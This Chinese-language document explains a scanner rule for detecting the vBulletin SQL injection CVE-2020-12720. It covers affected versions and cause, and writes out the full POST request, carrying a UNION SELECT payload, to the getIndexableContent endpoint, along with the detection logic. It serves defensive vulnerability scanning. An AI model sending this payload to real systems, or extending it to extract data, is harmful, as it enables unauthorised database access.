# vBulletin SQL注入漏洞（CVE-2020-12720）探测原理说明

## 1. 漏洞简介

vBulletin 5.5.6pl1之前、5.6.0至5.6.0pl1、5.6.1至5.6.1pl1版本存在SQL注入漏洞。由于访问控制不当，攻击者可通过特定接口注入恶意SQL语句，进而获取敏感数据或执行系统命令。

## 2. 影响范围

- 受影响产品：vBulletin 5.5.6pl1之前、5.6.0至5.6.0pl1、5.6.1至5.6.1pl1
- 只要未打补丁的相关版本均可能被利用

## 3. 漏洞原理

该漏洞源于接口未正确校验用户权限，导致攻击者可构造恶意POST请求，将SQL注入payload传递给后端数据库，造成任意SQL语句执行。

## 4. 利用方式与攻击流程

1. 攻击者构造特定POST请求，向目标接口注入SQL语句。
2. 数据库执行恶意SQL，返回包含特征字符串的响应。
3. 攻击者据此判断漏洞是否存在，甚至进一步利用。

## 5. 探测原理与流程（yaml 规则详细说明）

该yaml规则通过注入特征payload并检测响应内容进行无害化探测，流程如下：

### 5.1 探测请求的构造

- 发送POST请求到如下接口：
  ```
  POST /ajax/api/content_infraction/getIndexableContent HTTP/1.1
  Host: <目标主机>
  X-Requested-With: XMLHttpRequest
  Accept: */*
  Content-Type: application/x-www-form-urlencoded

  nodeId%5Bnodeid%5D=1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,CONCAT('vbulletin','rce',@@version),19,20,21,22,23,24,25,26,27-- -
  ```

### 5.2 预期响应与交互

- **HTTP响应内容**：
  - 响应体需包含`vbulletinrce`，表明SQL注入成功。

### 5.3 判定逻辑

- 只有当响应体中包含`vbulletinrce`，才判定目标存在SQL注入漏洞。

- **判定流程伪代码**：
  ```pseudo
  payload = "1 union select ... CONCAT('vbulletin','rce',@@version) ..."
  发送POST /ajax/api/content_infraction/getIndexableContent，参数为payload
  若响应体含vbulletinrce：
      判定目标存在SQL注入漏洞
  ```

- **流程图**：
  ```mermaid
  graph TD
      A[发送带payload的POST请求到getIndexableContent] --> B{响应体含vbulletinrce?}
      B -- 否 --> F[无漏洞或未触发]
      B -- 是 --> E[判定目标存在SQL注入漏洞]
  ```

通过上述流程，既保证了探测的准确性，也避免了对目标系统的实际危害。

## 6. 参考链接

- [GitHub Exploits](https://github.com/rekter0/exploits/tree/master/CVE-2020-12720)
- [NVD官方漏洞库](https://nvd.nist.gov/vuln/detail/CVE-2020-12720)
- [vBulletin官方安全公告](https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4440032-vbulletin-5-6-1-security-patch-level-1)
- [PacketStorm Security 1](http://packetstormsecurity.com/files/157716/vBulletin-5.6.1-SQL-Injection.html)
- [PacketStorm Security 2](http://packetstormsecurity.com/files/157904/vBulletin-5.6.1-SQL-Injection.html) 